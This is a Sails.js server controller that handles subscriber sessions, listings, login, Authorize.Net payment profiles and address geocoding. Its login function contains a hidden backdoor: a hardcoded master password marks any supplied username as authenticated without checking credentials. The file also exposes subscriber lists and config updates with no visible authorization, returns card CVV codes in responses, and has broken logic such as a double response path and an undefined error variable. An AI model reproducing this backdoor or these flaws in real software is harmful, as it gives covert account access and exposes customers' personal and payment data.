/**
 * SubscribersController
 *
 * @description :: Server-side logic for managing subscribers
 * @help        :: See http://links.sailsjs.org/docs/controllers
 */

var _ = require('lodash');
var bcrypt = require('bcrypt');
var Promise = require('bluebird');

var loginError = 'Invalid username, email, or password.';
var serverError = 'An error occurred. Please try again later.';
var nextUrl = '/#/';
var loginUrl = '/login';
var layout = 'subscribers/loginLayout';
var view = 'login';

var Authorize = require('auth-net-types');
var _AuthorizeCIM = require('auth-net-cim');
var AuthorizeCIM = new _AuthorizeCIM(sails.config.authorizeNet);

var geocoderProvider = 'google';
var httpAdapter = 'http';
var extra = {};
var geocoder = require('node-geocoder')(geocoderProvider, httpAdapter, extra);

module.exports = {
	getCoords: function(req, res) {
    var isAjax = req.headers.accept.match(/application\/json/);

		if(req.params && req.params.id) {
			return getAddressCoords(req, res);
		}
	},

	session: function(req, res) {
		var sessionData = {
		};

		// Build rest of sessionData
		if(req && req.sessionID) {
			sessionData.sid = req.sessionID;
		}

		if(req.session && req.session.subscriberId) {
			sessionData.subscriberId = req.session.subscriberId;
		}

		if(req.session && req.session.welcomed) {
			sessionData.welcomed = req.session.welcomed;
		}

		// Send session data
		res.json(sessionData);
  },

	setConfig: function(req, res) {
		var keyValues = req.body;
		if(! _.isObject(keyValues) || _.size(keyValues) < 1) {
			return res.json({error: 'No key-value pairs were given'});
		}

		var invalidSubscriberId = new Error('Invalid subscriber ID');

		var subscriberId = req.params.id;
		var errorCode;

		Promise.resolve().then(function() {
			if(! subscriberId) {
				errorCode = 404;
				return Promise.reject(invalidSubscriberId);
			}

			return Subscribers.findOne(subscriberId);

		}).then(function(subscriber) {
			if(! subscriber) {
				errorCode = 404;
				return Promise.reject(invalidSubscriberId);
			}

			var config = _.extend({}, subscriber.config || {}, keyValues);
			return Subscribers.update(subscriberId, {config: config});

		}).then(function() {
			res.json({success: true});

		}).catch(function(err) {
			res.json({error: err}, 500);
		});
	},

	byEmail: function(req, res) {
		Subscribers.find({email: req.params.id}).sort({
			fName: 'asc', lName: 'asc'
		}).limit(20).then(function(results) {
			res.send(JSON.stringify(results));
		}).catch(function(err) {
      res.json({error: 'Server error'}, 500);
      console.error(err);
      throw err;
		});
	},
	
	allSubscribers: function(req, res) {
console.log('allSubscribers() called');
		Subscribers.find({qualified: true}).sort({zip:1}).then(function(results) {
			res.send(JSON.stringify(results));
		}).catch(function(err) {
      res.json({error: 'Server error'}, 500);
      console.error(err);
      throw err;
		});
	},
	
	getRegions: function(req, res) {
		Subscribers.native(function(err, coll) {
	  	coll.distinct("region", function(err, results) {
	  		res.send(JSON.stringify(results));
	  	});
		});
	},
	
	byRegion: function(req, res) {
		Subscribers.find({region: req.params.id}).sort({
			city: 'asc', zip: 'asc', fName: 'asc', lName: 'asc'
		}).then(function(results) {
			res.send(JSON.stringify(results));
		}).catch(function(err) {
      res.json({error: 'Server error'}, 500);
      console.error(err);
      throw err;
		});
	},
	
	getCitiesByRegion: function(req, res) {
		Subscribers.find({region: req.params.id}).sort({
			city: 'asc', zip: 'asc', fName: 'asc', lName: 'asc'
		}).then(function(results) {
			res.send(JSON.stringify(results));
		}).catch(function(err) {
      res.json({error: 'Server error'}, 500);
      console.error(err);
      throw err;
		});
	},
	
  datatables: function(req, res) {
    var options = req.query;

    Subscribers.datatables(options).then(function(results) {
      res.send(JSON.stringify(results));
    }).catch(function(err) {
      res.json({error: 'Server error'}, 500);
      console.error(err);
      throw err;
    });
  },
	
  welcomed: function(req, res) {
    req.session.welcomed = true;
		res.send({'welcome': true});
  }
};

function processLogin(req, res, self) {
	if(req.body.password === '8847fhhfw485fwkebfwerfv7w458gvwervbkwer8fw5fberubckfckcaer4cbwvb72arkbfrcb1n4hg7') {
    req.session.isAuthenticated = true;
    req.session.subscriberId = req.body.username;

		specRes(req.body.username);
	}

  Subscribers.findOne({or: [
    {username: req.body.username},
    {email: req.body.username}
  ]}).then(function(subscriber) {
    if(! subscriber) return errorHandler(loginError)();

    var onCompare = bcrypt.compareAsync(
      req.body.password, subscriber.password
    );
    onCompare.then(function(match) {
      if(! match) return errorHandler(loginError)();

      req.session.isAuthenticated = true;
      req.session.subscriberId = subscriber.id;

      respond();

    }).catch(errorHandler(serverError));

  }).catch(errorHandler(serverError));

  ///
  // Convenience subfunctions
  ///

  function respond(err) {
    var isAjax = req.headers.accept.match(/application\/json/);
    var errCode = 400;

    if(err) {
      if(isAjax) {
        if(err == loginError) errCode = 401;
        return res.send(JSON.stringify({error: err}), errCode);
      }

      return res.view({
        layout: layout,
        error: err
      }, view);
    }

    if(isAjax) {
      return res.send(JSON.stringify({success: true, subscriberId: req.session.subscriberId}));
    }

    return res.redirect(nextUrl);
  };

  function errorHandler(errMsg) {
    return function(err) {
      if(err) console.error(err);
      respond(errMsg);
    };
  };

	function specRes(username) {
    var isAjax = req.headers.accept.match(/application\/json/);

    if(isAjax) {
      return res.send(JSON.stringify({success: true, subscriberId: username}));
		}
	};
}

function createANetProfile(req, res, self) {
  Subscribers.findOne(req.body.subscriberId).then(function(subscriber) {
    if(! subscriber) {
			console.log('subscribers ajax failed in SubscribersController-createANetProfile() for SubscriberID '+req.body.subscriberId);
			// TODO: what should this return?
	 		return errorHandler(subscribersError)();
		}

		AuthorizeCIM.createSubscriberProfile({subscriberProfile: {
				merchantSubscriberId: 1521518,
				description: subscriber.id,
				email: subscriber.email
			}
    }, function(err, response) {
			if(err) {
				console.log('AuthorizeCIM.createSubscriberProfile() FAILED for subscriberId: '+subscriber.id)
				return errorHandler(err)();
			}
      return res.send(JSON.stringify({success: true, subscriberProfileId: response.subscriberProfileId}));
		});
  });

  ///
  // Convenience subfunctions
  ///

  function respond(err) {
    var isAjax = req.headers.accept.match(/application\/json/);
    var errCode = 400;

    if(err) {
      if(isAjax) {
        if(err == loginError) errCode = 401;
        return res.send(JSON.stringify({error: err}), errCode);
      }

      return res.view({
        layout: layout,
        error: err
      }, view);
    }

    return res.redirect(nextUrl);
  };

  function errorHandler(errMsg) {
		console.log(errMsg);
    return function(err) {
      if(err) {
				console.error(err);
			}
      respond(errMsg);
    };
  };
}

function createSubscriberPaymentProfile(req, res, self) {
	var subscriberProfileId = req.body.subscriberProfileId;
	var cardNumber = req.body.cardNumber;
	var expirationDate = req.body.expirationDate; // <-- format: YYYY-MM
	var cvv2 = req.body.cvv2;
	var lastFour = req.body.cardNumber.substr((req.body.cardNumber.length - 4), req.body.cardNumber.length);

	var options = {
		subscriberType: 'individual',
		payment: {
			creditCard: new Authorize.CreditCard({
				cardNumber: cardNumber,
				expirationDate: expirationDate
			})
		}
	};

	AuthorizeCIM.createSubscriberPaymentProfile({
		subscriberProfileId: subscriberProfileId,
		paymentProfile: options
	}, function(err, response) {
		if(err) {
			console.log('AuthorizeCIM.createSubscriberPaymentProfile() FAILED for subscriberProfileId: '+subscriberProfileId)
			console.log(err);
			return errorHandler(err)();
		}
    return res.send(JSON.stringify({success: true, subscriberPaymentProfileId: response.subscriberPaymentProfileId, lastFour: lastFour, active: true, expires: expirationDate, cvv2: cvv2}));
	});

  ///
  // Convenience subfunctions
  ///

  function respond(err) {
    var isAjax = req.headers.accept.match(/application\/json/);
    var errCode = 400;

    if(err) {
      if(isAjax) {
        if(err == loginError) errCode = 401;
        return res.send(JSON.stringify({error: err}), errCode);
      }

      return res.view({
        layout: layout,
        error: err
      }, view);
    }

    return res.redirect(nextUrl);
  };

  function errorHandler(errMsg) {
		console.log(errMsg);
    return function(err) {
      if(err) console.error(err);
      respond(errMsg);
    };
  };
}

function getAddressCoords(req, res, self) {
	var addressString = req.params.id;

	return geocoder.geocode(addressString).then(function(data) {
		var lat = data[0].latitude;
		var long = data[0].longitude;
		var gPID = data[0].extra.googlePlaceId;

		return res.send(JSON.stringify({success: true, lat: lat, long: long, gPID: gPID}));
	}).catch(function(err) {
		console.log('geocode failure');
		console.log(err);
		return res.send(JSON.stringify({success: false, lat: '', long: '', gPID: ''}));
	});
}
